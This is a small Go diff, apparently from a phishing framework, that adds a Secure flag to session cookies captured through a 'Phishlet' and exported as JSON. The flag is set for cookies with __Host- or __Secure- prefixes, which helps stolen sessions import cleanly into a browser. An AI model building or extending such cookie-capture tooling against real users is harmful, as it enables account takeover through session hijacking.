@@ -1207,6 +1207,7 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 		Name           string `json:"name"`
 		HttpOnly       bool   `json:"httpOnly,omitempty"`
 		HostOnly       bool   `json:"hostOnly,omitempty"`
+		Secure         bool   `json:"secure,omitempty"`
 	}
 
 	var cookies []*Cookie
@@ -1219,6 +1220,10 @@ func (t *Terminal) cookieTokensToJSON(pl *Phishlet, tokens map[string]map[string
 				Value:          v.Value,
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
+				Secure:         false,
+			}
+			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
+				c.Secure = true
 			}
 			if domain[:1] == "." {
 				c.HostOnly = false
